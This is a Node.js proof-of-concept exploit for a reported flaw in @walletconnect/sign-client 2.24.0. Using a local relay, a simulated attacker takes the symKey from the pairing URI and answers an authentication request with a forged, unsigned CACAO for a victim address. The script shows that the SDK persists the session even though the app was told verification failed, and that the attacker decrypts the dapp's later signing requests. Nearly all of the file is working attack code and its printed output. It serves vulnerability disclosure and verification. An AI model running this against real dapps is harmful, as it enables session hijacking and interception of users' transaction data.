// PoC for FINDING 1, end to end, against a real @walletconnect/sign-client
// dapp. Where finding-1-missing-return.mjs shows only that the fall-through
// EXISTS in the shipped bundle, this script shows what it BUYS: a persisted,
// subscribed session held by an attacker for an account it does not control.
//
// Cast:
//
//   relay     A local WebSocket relay speaking the irn_* JSON-RPC surface.
//             It is HONEST TRANSPORT, not the adversary. It exists only so the
//             run is offline and reproducible. It never decrypts anything: the
//             pairing key reaches the attacker the way the threat model says it
//             does, from the URI, not from the relay.
//
//   dapp      A real SignClient 2.24.0, unmodified, driven through its public
//             API. Nothing in this script patches, stubs or monkey-patches it.
//
//   attacker  Holds the pairing URI (the modelled precondition: the URI is
//             normally rendered as a QR code) and can publish on the relay.
//             It has NO wallet, NO signing key for the victim, and never
//             produces a valid signature.
//
//   victim    An address the attacker does not control. No private key for it
//             exists anywhere in this process.
//
// What is demonstrated, in order:
//
//   1. the dapp's authenticate() promise REJECTS -- the application is told
//      that verification failed;
//   2. and a session for the victim's address is nevertheless in the public
//      client.session store, subscribed;
//   3. it survives a restart of the client from persistent storage;
//   4. the dapp will send on that session, and the attacker decrypts what it
//      sends -- the confidentiality violation the model reports as `txdata`.
//
// Run:  node finding-1-session-takeover.mjs

import ws from "ws";
import { SignClient } from "@walletconnect/sign-client";
import {
  deriveSymKey,
  hashKey,
  encrypt,
  decrypt,
  generateKeyPair,
} from "@walletconnect/utils";
import { rmSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { execFileSync } from "node:child_process";

// Restart probe. Step 5 re-reads the store from a SEPARATE PROCESS, so the
// claim is about what was persisted to disk and not about objects still alive
// in this one. The parent invokes this branch on itself.
if (process.argv[2] === "--inspect-store") {
  const { SignClient: SC } = await import("@walletconnect/sign-client");
  const c = await SC.init({
    projectId: "0".repeat(32),
    relayUrl: process.argv[4],
    name: "honest-dapp",
    storageOptions: { database: process.argv[3] },
  });
  console.log(JSON.stringify(c.session.getAll()));
  process.exit(0);
}

const WebSocketServer = ws.Server;

const red = (s) => `\x1b[31m${s}\x1b[0m`;
const green = (s) => `\x1b[32m${s}\x1b[0m`;
const ok = (b) => (b ? green("true") : red("false"));
const rule = (t) => console.log(`\n${"-".repeat(72)}\n${t}\n${"-".repeat(72)}`);

// The account the attacker will claim. Nothing in this process holds a key for
// it; the signature offered below is a constant, not a signature.
const VICTIM = "0x1111111111111111111111111111111111111111";
const NOT_A_SIGNATURE = `0x${"de".repeat(32)}${"ad".repeat(32)}1b`;

// ---------------------------------------------------------------------------
// The relay. Honest transport: subscribe, publish, fan out. It reads no
// plaintext, holds no key, and makes no decision.
// ---------------------------------------------------------------------------
const subs = new Map(); // topic -> Set(socket)
const mailbox = new Map(); // topic -> [message]; real relays queue, so a
                           // subscriber that arrives late still gets the message
let seq = 1;

const wss = new WebSocketServer({ port: 0 });
await new Promise((r) => wss.on("listening", r));
const RELAY = `ws://127.0.0.1:${wss.address().port}`;

wss.on("connection", (sock) => {
  sock.on("message", (raw) => {
    let m;
    try { m = JSON.parse(raw.toString()); } catch { return; }
    const reply = (result) =>
      sock.send(JSON.stringify({ id: m.id, jsonrpc: "2.0", result }));
    const deliver = (sock, topic, message) =>
      sock.send(JSON.stringify({
        id: seq++, jsonrpc: "2.0", method: "irn_subscription",
        params: { id: `s${seq}`, data: { topic, message, publishedAt: Date.now() } },
      }));
    const sub = (topic) => {
      if (!subs.has(topic)) subs.set(topic, new Set());
      subs.get(topic).add(sock);
      for (const queued of mailbox.get(topic) ?? []) deliver(sock, topic, queued);
      return `sub${seq++}`;
    };
    switch (m.method) {
      case "irn_subscribe": return reply(sub(m.params.topic));
      case "irn_batchSubscribe": return reply(m.params.topics.map(sub));
      case "irn_unsubscribe":
      case "irn_batchUnsubscribe": return reply(true);
      case "irn_batchFetchMessages": return reply({ messages: [] });
      case "irn_publish": {
        const { topic, message } = m.params;
        reply(true);
        if (!mailbox.has(topic)) mailbox.set(topic, []);
        mailbox.get(topic).push(message);
        for (const peer of subs.get(topic) ?? []) {
          if (peer === sock) continue;
          deliver(peer, topic, message);
        }
        return;
      }
      default: return reply(true);
    }
  });
});

// A minimal relay client for the attacker, so that it uses the same public
// interface as everyone else rather than reaching into the dapp's objects.
class RelayPeer {
  constructor(url) {
    this.sock = new ws(url);
    this.handlers = [];
    this.ready = new Promise((r) => this.sock.on("open", r));
    this.sock.on("message", (raw) => {
      const m = JSON.parse(raw.toString());
      if (m.method === "irn_subscription") {
        for (const h of this.handlers) h(m.params.data);
      }
    });
  }
  async subscribe(topic) {
    await this.ready;
    this.sock.send(JSON.stringify({ id: seq++, jsonrpc: "2.0", method: "irn_subscribe", params: { topic } }));
  }
  async publish(topic, message, tag) {
    await this.ready;
    this.sock.send(JSON.stringify({
      id: seq++, jsonrpc: "2.0", method: "irn_publish",
      params: { topic, message, ttl: 300, prompt: false, tag },
    }));
  }
  onMessage(fn) { this.handlers.push(fn); }
  close() { this.sock.close(); }
}

const waitFor = async (fn, ms = 8000) => {
  const until = Date.now() + ms;
  for (;;) {
    const v = await fn();
    if (v) return v;
    if (Date.now() > until) return null;
    await new Promise((r) => setTimeout(r, 50));
  }
};

const store = join(mkdtempSync(join(tmpdir(), "wc-oca-poc-")), "walletconnect.db");

// ---------------------------------------------------------------------------
// The dapp.
// ---------------------------------------------------------------------------
rule("1. An honest dapp asks a wallet to authenticate");

const dapp = await SignClient.init({
  projectId: "0".repeat(32),
  relayUrl: RELAY,
  name: "honest-dapp",
  storageOptions: { database: store },
});

const REQUEST = {
  chains: ["eip155:1"],
  domain: "honest.example",
  aud: "https://honest.example/login",
  nonce: "HONEST-NONCE-0000000001",
  uri: "https://honest.example/login",
  methods: ["personal_sign", "eth_sendTransaction"],
};

const { uri, response } = await dapp.authenticate(REQUEST);

// The application's view of the exchange. Kept as a settled outcome so the
// script can report what the caller was told.
const promised = response()
  .then((v) => ({ status: "resolved", value: v }))
  .catch((e) => ({ status: "rejected", reason: e?.message ?? String(e) }));

console.log(`dapp requested   domain=${REQUEST.domain} nonce=${REQUEST.nonce}`);
console.log(`pairing URI      ${String(uri).slice(0, 72)}...`);

// ---------------------------------------------------------------------------
// The attacker.
// ---------------------------------------------------------------------------
rule("2. An attacker holding the pairing URI answers, with no wallet at all");

const [, pairingTopic, query] = String(uri).match(/^wc:([0-9a-f]+)@\d+\?(.*)$/);
const symKey = new URLSearchParams(query).get("symKey");
console.log(`attacker read    pairing topic ${pairingTopic.slice(0, 16)}...`);
console.log(`attacker read    symKey from the URI (as a QR observer would)`);

const peer = new RelayPeer(RELAY);
const gotRequest = new Promise((resolve) => {
  peer.onMessage(({ topic, message }) => {
    if (topic !== pairingTopic) return;
    try {
      const rpc = JSON.parse(decrypt({ symKey, encoded: message }));
      if (rpc.method === "wc_sessionAuthenticate") resolve(rpc);
    } catch { /* not for us */ }
  });
});
await peer.subscribe(pairingTopic);

const rpc = await Promise.race([
  gotRequest,
  new Promise((r) => setTimeout(() => r(null), 8000)),
]);
if (!rpc) {
  console.log(red("did not observe the authenticate request; aborting"));
  process.exit(1);
}

const { authPayload, requester } = rpc.params;
console.log(`attacker opened  the request with that symKey`);
console.log(`  requester.publicKey  ${requester.publicKey.slice(0, 32)}...`);
console.log(`  nonce                ${authPayload.nonce}`);
console.log(`  domain               ${authPayload.domain}`);

// Response topic and response key are both computable from what the request
// revealed. No wallet key is involved.
const responseTopic = hashKey(requester.publicKey);
const attackerKeys = generateKeyPair();
const responseKey = deriveSymKey(attackerKeys.privateKey, requester.publicKey);

// The CACAO. Every field except `iss` is copied from the dapp's own request,
// so domain, aud and nonce all MATCH. This isolates finding 1: the only thing
// wrong with this CACAO is that the signature is not a signature.
const payload = { ...authPayload, iss: `did:pkh:eip155:1:${VICTIM}` };
const cacao = {
  h: { t: "caip122" },
  p: payload,
  s: { t: "eip191", s: NOT_A_SIGNATURE },
};

console.log(`attacker claims  ${VICTIM}`);
console.log(`  signature over the statement is  ${red("not a signature")}`);
console.log(`  domain/aud/nonce match the request, so only the signature is wrong`);

const message = JSON.stringify({
  id: rpc.id,
  jsonrpc: "2.0",
  result: {
    cacaos: [cacao],
    responder: { publicKey: attackerKeys.publicKey, metadata: { name: "not-a-wallet", description: "", url: "", icons: [] } },
  },
});

await peer.publish(
  responseTopic,
  encrypt({ message, symKey: responseKey, type: 1, senderPublicKey: attackerKeys.publicKey }),
  1117, // wc_sessionAuthenticate response
);
console.log(`attacker published a type 1 envelope on hashKey(requester.publicKey)`);

// ---------------------------------------------------------------------------
// What the application was told.
// ---------------------------------------------------------------------------
rule("3. What the application is told");

const outcome = await Promise.race([
  promised,
  new Promise((r) => setTimeout(() => r({ status: "pending" }), 8000)),
]);
console.log(`authenticate() promise:  ${outcome.status === "rejected" ? red("REJECTED") : outcome.status}`);
if (outcome.reason) console.log(`  ${outcome.reason}`);

// ---------------------------------------------------------------------------
// What the SDK actually did.
// ---------------------------------------------------------------------------
rule("4. What the SDK did anyway");

const session = await waitFor(async () => dapp.session.getAll()[0]);
if (!session) {
  console.log(red("NOT CONFIRMED: no session was created."));
  console.log("Either the bundle is patched or the flow changed. Do not report a");
  console.log("confirmation from this run.");
  rmSync(store, { recursive: true, force: true });
  process.exit(1);
}

const accounts = Object.values(session.namespaces).flatMap((n) => n.accounts ?? []);
console.log(`client.session.getAll().length   ${green(dapp.session.getAll().length)}`);
console.log(`  topic          ${session.topic}`);
console.log(`  accounts       ${red(accounts.join(", "))}`);
console.log(`  methods        ${Object.values(session.namespaces).flatMap((n) => n.methods ?? []).join(", ")}`);
console.log(`  peer           ${session.peer?.metadata?.name}`);
console.log("");
console.log(`account is the victim's?          ${ok(accounts.some((a) => a.toLowerCase().endsWith(VICTIM.slice(2).toLowerCase())))}`);
console.log(`attacker ever signed for it?      ${red("no")}`);

// ---------------------------------------------------------------------------
// Restart.
// ---------------------------------------------------------------------------
rule("5. The session survives a restart");

// A separate node process, reading the same storage directory. Nothing from
// this process is shared with it but the files on disk.
const selfPath = fileURLToPath(import.meta.url);
let after = [];
try {
  after = JSON.parse(
    execFileSync(process.execPath, [selfPath, "--inspect-store", store, RELAY], {
      encoding: "utf8", stdio: ["ignore", "pipe", "ignore"],
    }).trim().split("\n").pop(),
  );
} catch (e) {
  console.log(red(`restart probe failed: ${e.message}`));
}
console.log("a separate node process re-read the same storage directory");
console.log(`sessions after restart            ${after.length ? green(after.length) : red(0)}`);
if (after.length) {
  const s0 = after[0];
  console.log(`  topic          ${s0.topic}`);
  console.log(`  accounts       ${red(Object.values(s0.namespaces).flatMap((n) => n.accounts ?? []).join(", "))}`);
}

// ---------------------------------------------------------------------------
// The confidentiality violation.
// ---------------------------------------------------------------------------
rule("6. The dapp sends on that session, and the attacker reads it");

const sessionKey = deriveSymKey(attackerKeys.privateKey, requester.publicKey);
const sessionTopic = session.topic;

const intercepted = new Promise((resolve) => {
  peer.onMessage(({ topic, message }) => {
    if (topic !== sessionTopic) return;
    try { resolve(JSON.parse(decrypt({ symKey: sessionKey, encoded: message }))); } catch {}
  });
});
await peer.subscribe(sessionTopic);

const TXDATA = "transfer 100 USDC to 0xC0FFEE...";
dapp
  .request({
    topic: sessionTopic,
    chainId: "eip155:1",
    request: { method: "personal_sign", params: [TXDATA, VICTIM] },
  })
  .catch(() => {});

const stolen = await Promise.race([
  intercepted,
  new Promise((r) => setTimeout(() => r(null), 8000)),
]);

if (stolen) {
  console.log(`the dapp sent a request on the attacker's session, and the attacker`);
  console.log(`decrypted it with the session key it chose:`);
  console.log(`  method   ${stolen.params?.request?.method}`);
  console.log(`  params   ${red(JSON.stringify(stolen.params?.request?.params))}`);
} else {
  console.log(red("did not intercept a session request"));
}

// ---------------------------------------------------------------------------
rule("verdict");

const confirmed =
  outcome.status === "rejected" &&
  accounts.some((a) => a.toLowerCase().endsWith(VICTIM.slice(2).toLowerCase())) &&
  after.length > 0 &&
  Boolean(stolen);

if (confirmed) {
  console.log("CONFIRMED. The application was told verification failed, and the SDK");
  console.log("still holds a persisted, subscribed session whose account is an address");
  console.log("nobody proved control of. The attacker chose the session key, so what");
  console.log("the dapp sends on that session is readable by the attacker.");
  console.log("");
  console.log("No signature was ever produced. No wallet took part.");
} else {
  console.log(red("NOT CONFIRMED against this build."));
  console.log("Inspect the steps above before drawing any conclusion from this run.");
}

rmSync(store, { recursive: true, force: true });
peer.close();
wss.close();
process.exit(confirmed ? 0 : 1);
